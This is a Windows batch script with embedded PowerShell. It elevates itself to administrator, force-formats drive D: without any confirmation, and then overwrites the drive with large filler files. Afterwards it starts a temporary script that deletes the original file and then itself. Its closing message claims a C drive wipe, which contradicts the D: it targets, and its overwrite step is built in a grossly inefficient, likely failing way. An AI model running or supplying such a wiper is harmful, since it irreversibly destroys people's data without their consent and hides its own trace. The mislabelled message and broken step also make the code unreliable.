@echo off
powershell -Command "if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {Start-Process '%~f0' -Verb RunAs; exit}"

powershell -Command "Format-Volume -DriveLetter D -FileSystem NTFS -Full -Force"

powershell -Command "$Drive='D:\'; $BlockSize=512MB; $DriveInfo=Get-PSDrive D; $DriveSize=$DriveInfo.Used + $DriveInfo.Free; $Blocks=[math]::Ceiling($DriveSize / $BlockSize); $Block=[byte[]](1..536870912 | ForEach-Object {0x01}); for ($i=0; $i -lt $Blocks; $i++) {[System.IO.File]::WriteAllBytes($Drive+'wipe_'+$i+'.bin', $Block)}"

set "TempScript=%temp%\delete_self.bat"
echo @echo off > "%TempScript%"
echo ping 127.0.0.1 -n 3 >nul >> "%TempScript%"
echo del "%~f0" >> "%TempScript%"
echo del "%TempScript%" >> "%TempScript%"
start "" "%TempScript%"

echo C drive wipe complete. Script self-deleting...
pause